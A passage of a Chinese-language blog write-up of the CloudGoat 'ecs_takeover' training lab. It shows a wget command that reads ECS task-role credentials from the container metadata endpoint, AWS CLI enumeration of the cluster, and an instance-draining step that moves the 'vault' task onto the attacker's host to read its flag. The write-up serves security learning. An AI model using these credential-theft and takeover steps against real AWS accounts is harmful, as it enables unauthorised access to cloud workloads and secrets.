+AWS_CONTAINER_CREDENTIALS_RELATIVE_URI=/v2/credentials/6b786c97-87aa-4a33-9c7b-c4fbef9f4638
+AWS_EXECUTION_ENV=AWS_ECS_EC2
+ECS_AGENT_URI=http://169.254.170.2/api/5272106b-c65e-4397-8272-9c66d4a16875
+ECS_CONTAINER_METADATA_URI_V4=http://169.254.170.2/v4/5272106b-c65e-4397-8272-9c66d4a16875
+ECS_CONTAINER_METADATA_URI=http://169.254.170.2/v3/5272106b-c65e-4397-8272-9c66d4a16875
+PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+PWD=/
+</code></pre>
+<figure data-type="image" tabindex="6"><img src="https://skyblu3519.github.io/post-images/ecs_takeover/1721052329917-4ff421f4-8a0e-46fa-aa0a-93fb986696fb.png" alt="image.png" loading="lazy"></figure>
+<p>访问<code>169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI</code>获取 Task Role 凭证</p>
+<pre><code class="language-yaml">docker exec 38a2028763d2 sh -c 'wget -q -O - 169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI'
+</code></pre>
+<figure data-type="image" tabindex="7"><img src="https://skyblu3519.github.io/post-images/ecs_takeover/1721034675973-96bd5dfd-8783-4a98-ae9c-ef58a1bfd235.png" alt="image.png" loading="lazy"></figure>
+<p>登录用户<code>privd</code><br>
+<img src="https://skyblu3519.github.io/post-images/ecs_takeover/1721035025366-31b69649-937b-4d42-b504-5db4130f10a3.png" alt="image.png" loading="lazy"></p>
+<p>下面开始收集集群信息。首先，列出集群</p>
+<pre><code class="language-json">aws --profile task-role ecs list-clusters 
+</code></pre>
+<figure data-type="image" tabindex="8"><img src="https://skyblu3519.github.io/post-images/ecs_takeover/1721035453529-ca13f118-76ff-44be-a6f0-592234422273.png" alt="image.png" loading="lazy"></figure>
+<p>查看集群的模式，<code>&quot;registeredContainerInstancesCount&quot;: 2</code>得知集群里运行的 EC2 数量为 2，这也表明这一个 EC2 Mode 的 ECS</p>
+<pre><code class="language-json">aws --profile task-role ecs describe-clusters --clusters arn:aws:ecs:us-east-1:637423561540:cluster/ecs-takeover-ecs_takeover_cgid1cex40y24h-cluster
+</code></pre>
+<figure data-type="image" tabindex="9"><img src="https://skyblu3519.github.io/post-images/ecs_takeover/1721047804876-a67bd3e2-4b21-4019-8136-4095ffebcfac.png" alt="image.png" loading="lazy"></figure>
+<p>列出集群里的 Container Instances</p>
+<pre><code class="language-json">aws --profile task-role ecs list-container-instances --cluster arn:aws:ecs:us-east-1:637423561540:cluster/ecs-takeover-ecs_takeover_cgid1cex40y24h-cluster
+{
+    &quot;containerInstanceArns&quot;: [
+        &quot;arn:aws:ecs:us-east-1:637423561540:container-instance/ecs-takeover-ecs_takeover_cgid1cex40y24h-cluster/363039e07fcf40db99d5a5c57558a50c&quot;,
+        &quot;arn:aws:ecs:us-east-1:637423561540:container-instance/ecs-takeover-ecs_takeover_cgid1cex40y24h-cluster/e5edf45c9c5a44f9a21ab32987022046&quot;
+    ]
+}
+</code></pre>
+<p>查看这两个 Container Instances 对应的实例ID</p>
+<pre><code class="language-json">aws --profile task-role ecs describe-container-instances --cluster arn:aws:ecs:us-east-1:637423561540:cluster/ecs-takeover-ecs_takeover_cgid1cex40y24h-cluster --container-instances arn:aws:ecs:us-east-1:637423561540:container-instance/ecs-takeover-ecs_takeover_cgid1cex40y24h-cluster/363039e07fcf40db99d5a5c57558a50c --query &quot;containerInstances[*].ec2InstanceId&quot;
+[
+    &quot;i-0118453e343e82efd&quot;
+]
+
+aws --profile task-role ecs describe-container-instances --cluster arn:aws:ecs:us-east-1:637423561540:cluster/ecs-takeover-ecs_takeover_cgid1cex40y24h-cluster --container-instances arn:aws:ecs:us-east-1:637423561540:container-instance/ecs-takeover-ecs_takeover_cgid1cex40y24h-cluster/e5edf45c9c5a44f9a21ab32987022046 --query &quot;containerInstances[*].ec2InstanceId&quot;
+[
+    &quot;i-0fe09f6db2ba10228&quot;
+]
+</code></pre>
+<p>从前面控制的实例元数据可知，这个实例对应的是第一个 Container Instances<br>
+<img src="https://skyblu3519.github.io/post-images/ecs_takeover/1721048453179-cd9b2ad6-ff0d-4c13-8f1e-548c7ebc4c93.png" alt="image.png" loading="lazy"></p>
+<p>列出集群中的服务</p>
+<pre><code class="language-json">aws --profile task-role ecs list-services --cluster arn:aws:ecs:us-east-1:637423561540:cluster/ecs-takeover-ecs_takeover_cgid1cex40y24h-cluster
+{
+    &quot;serviceArns&quot;: [
+        &quot;arn:aws:ecs:us-east-1:637423561540:service/ecs-takeover-ecs_takeover_cgid1cex40y24h-cluster/vault&quot;,
+        &quot;arn:aws:ecs:us-east-1:637423561540:service/ecs-takeover-ecs_takeover_cgid1cex40y24h-cluster/vulnsite&quot;,
+        &quot;arn:aws:ecs:us-east-1:637423561540:service/ecs-takeover-ecs_takeover_cgid1cex40y24h-cluster/privd&quot;
+    ]
+}
+</code></pre>
+<p>该渗透场景的目标是<code>vault</code>服务，所以我们查看该服务详细的信息。从输出的结果中可以看到：</p>
+<ul>
+<li><code>desiredCount</code>: 服务期望运行的任务数量为 1。</li>
+<li><code>runningCount</code>: 当前正在运行的任务数量也为 1。</li>
+<li><code>pendingCount</code>: 等待启动的任务数量为 0，表明没有任务在排队等待启动。</li>
+</ul>
+<pre><code class="language-json">aws --profile task-role ecs describe-services --cluster arn:aws:ecs:us-east-1:637423561540:cluster/ecs-takeover-ecs_takeover_cgid1cex40y24h-cluster --services arn:aws:ecs:us-east-1:637423561540:service/ecs-takeover-ecs_takeover_cgid1cex40y24h-cluster/vault
+</code></pre>
+<figure data-type="image" tabindex="10"><img src="https://skyblu3519.github.io/post-images/ecs_takeover/1721048642479-bc0f3458-6881-49b3-83a7-c98ea656db1e.png" alt="image.png" loading="lazy"></figure>
+<p>再来看下该服务运行在哪个 Container Instances 上。首先，查看服务中的任务：</p>
+<pre><code class="language-json">aws --profile task-role ecs list-tasks --cluster arn:aws:ecs:us-east-1:637423561540:cluster/ecs-takeover-ecs_takeover_cgid1cex40y24h-cluster --service-name vault
+{
+    &quot;taskArns&quot;: [
+        &quot;arn:aws:ecs:us-east-1:637423561540:task/ecs-takeover-ecs_takeover_cgid1cex40y24h-cluster/e00e1be22a134245893031ee753ff53f&quot;
+    ]
+}
+</code></pre>
+<p>然后，描述这些任务以获取它们运行在哪个 Container Instance 上的信息。显示的是第二个我们控制外的 EC2</p>
+<pre><code class="language-json">aws --profile task-role ecs describe-tasks --cluster arn:aws:ecs:us-east-1:637423561540:cluster/ecs-takeover-ecs_takeover_cgid1cex40y24h-cluster --tasks arn:aws:ecs:us-east-1:637423561540:task/ecs-takeover-ecs_takeover_cgid1cex40y24h-cluster/e00e1be22a134245893031ee753ff53f --query &quot;tasks[*].containerInstanceArn&quot;
+[
+    &quot;arn:aws:ecs:us-east-1:637423561540:container-instance/ecs-takeover-ecs_takeover_cgid1cex40y24h-cluster/e5edf45c9c5a44f9a21ab32987022046&quot;
+]
+</code></pre>
+<p>为了将<code>vault</code>移到受控主机上，我们可以将<code>vault</code>所在的 Container Instance 状态更新为 <code>DRAINING</code>，这样 ECS 就会自动将这个服务调度要我们这台主机上。而这个操作对应的权限<code>ecs:UpdateContainerInstancesState</code>刚好在 Container Instance Role 上。</p>
+<p>重新获取 Container Instance Role 的凭证登录<br>
+<img src="https://skyblu3519.github.io/post-images/ecs_takeover/1721050303259-4cef4d7c-c197-4581-a230-dad911c1eba0.png" alt="image.png" loading="lazy"></p>
+<p>修改实例状态</p>
+<pre><code class="language-json">aws --profile ci-role ecs update-container-instances-state --cluster arn:aws:ecs:us-east-1:637423561540:cluster/ecs-takeover-ecs_takeover_cgid1cex40y24h-cluster --container-instances  arn:aws:ecs:us-east-1:637423561540:container-instance/ecs-takeover-ecs_takeover_cgid1cex40y24h-cluster/e5edf45c9c5a44f9a21ab32987022046 --status DRAINING
+</code></pre>
+<p>很快 task 被调度到了我们的受控主机上 <img src="https://skyblu3519.github.io/post-images/ecs_takeover/1721050515762-3736636e-4a31-4741-9719-9e0086c30229.png" alt="image.png" loading="lazy"></p>
+<p>读取Flag</p>
+<pre><code class="language-json">docker exec abe084998eb7 cat FLAG.TXT
+</code></pre>
+<figure data-type="image" tabindex="11"><img src="https://skyblu3519.github.io/post-images/ecs_takeover/1721050582298-b153b39c-d474-4503-a0c1-77cc0b235746.png" alt="image.png" loading="lazy"></figure>
+<h1 id="命令总结">命令总结</h1>
+<pre><code class="language-json">aws ecs describe-clusters --clusters [Cluster-ARN]
+aws ecs list-container-instances --cluster [Cluster-Name]
+aws ecs describe-container-instances --cluster [Cluster-Name] --container-instances [Container-Instance-ARNs]
+aws ecs list-services --cluster [Cluster-Name]
+aws ecs describe-services --cluster [Cluster-Name] --services [Service-ARNs]
+aws ecs list-tasks --cluster [Cluster-Name] --service-name [Service-Name]
+aws ecs describe-tasks --cluster [Cluster-Name] --tasks [Task-ARNs]
+aws ecs describe-container-instances --cluster [Cluster-Name] --container-instances [Container-Instance-ARNs]
+
+aws ecs update-container-instances-state --cluster &lt;your_cluster_name&gt; --container-instances &lt;target_container_instance&gt; --status DRAINING
+</code></pre>
+<h1 id="参考链接">参考链接</h1>
+<p><a href="https://www.ruse.tech/blogs/ecs-attack-methods">https://www.ruse.tech/blogs/ecs-attack-methods</a><br>
+<a href="https://docs.aws.amazon.com/zh_cn/AmazonECS/latest/developerguide/Welcome.html">https://docs.aws.amazon.com/zh_cn/AmazonECS/latest/developerguide/Welcome.html</a><br>
+<a href="https://www.bilibili.com/video/BV12E421K7ST/">https://www.bilibili.com/video/BV12E421K7ST/</a><br>
+<a href="https://www.youtube.com/watch?v=22IsSW3YD0A">https://www.youtube.com/watch?v=22IsSW3YD0A</a></p>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li><a href="#ecs%E5%BF%AB%E9%80%9F%E5%85%A5%E9%97%A8">ECS快速入门</a></li>
+<li><a href="#tf%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90">TF代码分析</a>
+<ul>
+<li><a href="#vpctf">vpc.tf</a></li>
+<li><a href="#iamtf">iam.tf</a></li>
+<li><a href="#ec2tf">ec2.tf</a></li>
+<li><a href="#ecstf">ecs.tf</a></li>
+<li><a href="#outputstf">outputs.tf</a></li>
+</ul>
+</li>
+<li><a href="#scenario-ecs_takeover">Scenario: ecs_takeover</a>
+<ul>
+<li><a href="#%E8%83%8C%E6%99%AF">背景</a></li>
+<li><a href="#%E6%B8%97%E9%80%8F%E6%B5%81%E7%A8%8B">渗透流程</a></li>
+</ul>
+</li>
+<li><a href="#%E5%91%BD%E4%BB%A4%E6%80%BB%E7%BB%93">命令总结</a></li>
+<li><a href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5">参考链接</a></li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://skyblu3519.github.io/post/cloudgoat-ba-chang-chu-ti-yan/">
+              <h3 class="post-title">
+                CloudGoat (☁️🐐)靶场初体验
+              </h3>
+            </a>
+          </div>
+        
+
+        
+
+        <div class="site-footer">
+  Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a>
+  <a class="rss" href="https://skyblu3519.github.io/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
